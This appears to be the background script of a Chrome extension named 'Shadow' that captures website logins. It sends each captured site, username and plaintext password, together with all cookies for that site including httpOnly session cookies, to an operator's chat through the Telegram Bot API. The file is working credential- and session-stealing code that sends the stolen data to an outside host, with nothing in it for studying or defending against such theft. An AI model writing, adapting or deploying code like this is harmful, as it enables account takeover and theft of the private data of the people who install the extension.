'use strict';

const TELEGRAM_API = 'https://api.telegram.org';

function openCredentialsPage() {
  const url = chrome.runtime.getURL('credentials.html');
  chrome.tabs.create({ url });
}

const TELEGRAM_MAX_LEN = 4096;

function formatCredentialMessage(entry, cookies) {
  const lines = [
    '🔐 Shadow – New login saved',
    '',
    `Site: ${entry.hostname || entry.url || '—'}`,
    `Username: ${entry.username || '—'}`,
    `Password: ${entry.password || '—'}`,
    `Saved: ${entry.savedAt ? new Date(entry.savedAt).toLocaleString() : '—'}`
  ];
  if (cookies && cookies.length > 0) {
    lines.push('', `🍪 Cookies (${cookies.length}):`, JSON.stringify(cookies));
  }
  return lines.join('\n');
}

function sendToTelegram(text) {
  return chrome.storage.local.get({ telegramBotToken: '', telegramChatId: '' }).then(({ telegramBotToken, telegramChatId }) => {
    if (!telegramBotToken.trim() || !telegramChatId.trim()) {
      return { ok: false, reason: 'not_configured' };
    }
    const url = `${TELEGRAM_API}/bot${telegramBotToken.trim()}/sendMessage`;
    return fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: telegramChatId.trim(),
        text: text,
        disable_web_page_preview: true
      })
    }).then((res) => res.json()).then((data) => {
      if (data.ok) return { ok: true };
      return { ok: false, reason: data.description || 'api_error' };
    }).catch((err) => ({ ok: false, reason: err.message }));
  });
}

chrome.commands.onCommand.addListener((command) => {
  if (command === 'open-credentials') openCredentialsPage();
});

function getCookiesForOrigin(origin) {
  const url = origin && origin.startsWith('http') ? origin + '/' : 'https://' + (origin || '') + '/';
  return chrome.cookies.getAll({ url }).then((cookies) =>
    cookies.map((c) => ({
      name: c.name,
      value: c.value,
      domain: c.domain,
      path: c.path,
      secure: c.secure,
      httpOnly: c.httpOnly
    }))
  );
}

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === 'NEW_CREDENTIAL' && message.entry) {
    const entry = message.entry;
    const text = formatCredentialMessage(entry, null);
    sendToTelegram(text).then(sendResponse);
    return true;
  }
  if (message.type === 'ATTACH_COOKIES' && message.hostname != null && message.savedAt) {
    const origin = message.origin || ('https://' + message.hostname);
    const clearPending = () => chrome.storage.local.remove('pendingLogin');
    getCookiesForOrigin(origin).then((cookies) => {
      return chrome.storage.local.get({ credentials: [] }).then(({ credentials }) => {
        const list = credentials || [];
        const idx = list.findIndex(
          (c) => c.hostname === message.hostname && c.savedAt === message.savedAt
        );
        if (idx === -1) {
          clearPending();
          return sendResponse({ ok: true });
        }
        list[idx] = { ...list[idx], cookies };
        if (cookies.length > 0) clearPending();
        return chrome.storage.local.set({ credentials: list }).then(() => {
          if (cookies.length === 0) return sendResponse({ ok: true });
          const cookieText = '🍪 Cookies for ' + message.hostname + ' (' + cookies.length + '):\n' + JSON.stringify(cookies);
          if (cookieText.length <= TELEGRAM_MAX_LEN) {
            return sendToTelegram(cookieText).then(sendResponse);
          }
          return sendToTelegram(cookieText.slice(0, TELEGRAM_MAX_LEN - 20) + '\n…(truncated)').then(sendResponse);
        });
      });
    }).catch(() => {
      clearPending();
      sendResponse({ ok: false });
    });
    return true;
  }
  if (message.type === 'TELEGRAM_TEST') {
    sendToTelegram('✅ Shadow – Telegram is connected. New logins will be sent here.').then(sendResponse);
    return true;
  }
});
